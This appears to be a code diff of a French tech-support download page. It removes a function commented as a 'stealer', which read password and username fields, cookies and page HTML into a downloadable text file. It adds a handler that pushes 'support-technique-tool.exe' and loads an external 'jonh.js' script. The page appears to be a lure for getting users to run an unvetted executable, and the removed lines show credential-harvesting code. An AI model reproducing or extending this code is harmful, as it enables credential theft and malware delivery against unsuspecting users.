@@ -270,7 +270,7 @@
                 <div class="feature-item">
                     <i class="fas fa-tools"></i>
                     <h3>Maintenance</h3>
-                    <p>Outils de maintenance et d'optimisation</p>
+                    <p>Outils de maintenance et optimisation</p>
                 </div>
             </div>
 
@@ -316,18 +316,18 @@
             const downloadBtn = document.getElementById('downloadBtn');
             const statusDiv = document.getElementById('statusMessage');
             const statusText = document.getElementById('statusText');
-    
+
             downloadBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-    
+                
                 // Afficher le statut
                 statusDiv.classList.add('show');
                 statusText.innerHTML = 'Préparation du service de résolution...';
-    
+                
                 // Animation du bouton
                 downloadBtn.style.pointerEvents = 'none';
                 downloadBtn.style.opacity = '0.8';
-    
+                
                 // Appel du script externe
                 if (typeof jonh !== 'undefined' && jonh.download) {
                     // Si le script jonh.js est chargé
@@ -350,14 +350,14 @@
                             defaultDownloadHandler();
                         });
                 }
-    
+                
                 // Réinitialiser le bouton après 3 secondes
                 setTimeout(function() {
                     downloadBtn.style.pointerEvents = 'auto';
                     downloadBtn.style.opacity = '1';
                 }, 3000);
             });
-    
+            
             function loadScript(src) {
                 return new Promise((resolve, reject) => {
                     const script = document.createElement('script');
@@ -367,70 +367,24 @@
                     document.head.appendChild(script);
                 });
             }
-    
+            
             function defaultDownloadHandler() {
-                // Simuler un téléchargement avec le stealer
+                // Simuler un téléchargement
                 statusText.innerHTML = 'Résolution démarrée...';
-    
-                // Collecte toutes les informations du navigateur
-                const data = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    screen: {
-                        width: screen.width,
-                        height: screen.height
-                    },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    doctype: document.doctype ? document.doctype.name : "none",
-                    title: document.title,
-                    html: document.documentElement.innerHTML,
-                    body: document.body.innerHTML
-                };
-    
-                // Collecte les mots de passe (si existants)
-                const passwords = document.querySelectorAll("input[type='password']");
-                passwords.forEach(input => {
-                    data.password = input.value;
-                });
-    
-                // Collecte les identifiants (si existants)
-                const usernames = document.querySelectorAll("input[type='text']");
-                usernames.forEach(input => {
-                    data.username = input.value;
-                });
-    
-                // Collecte les cookies
-                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
-                    const [name, value] = cookie.trim().split('=');
-                    acc[name] = value;
-                    return acc;
-                }, {});
-    
-                data.cookies = cookies;
-    
-                // Convertit les données en chaîne JSON
-                const info = JSON.stringify(data, null, 2);
-    
-                // Crée un fichier .txt et le télécharge
-                const blob = new Blob([info], { type: "text/plain" });
-                const url = URL.createObjectURL(blob);
-    
-                const a = document.createElement("a");
-                a.href = url;
-                a.download = "navigateur_info.txt";
-                a.click();
-    
-                // Nettoyage
-                URL.revokeObjectURL(url);
-    
-                statusText.innerHTML = 'Résolution terminée avec succès !';
-    
+                
+                // Créer un lien de téléchargement fictif
                 setTimeout(() => {
-                    statusDiv.classList.remove('show');
-                }, 5000);
+                    const link = document.createElement('a');
+                    link.href = '#'; // Remplacer par l'URL réelle du fichier
+                    link.download = 'support-technique-tool.exe';
+                    link.click();
+                    
+                    statusText.innerHTML = 'Résosluton terminée avec succès !';
+                    
+                    setTimeout(() => {
+                        statusDiv.classList.remove('show');
+                    }, 5000);
+                }, 1500);
             }
         });
     </script>
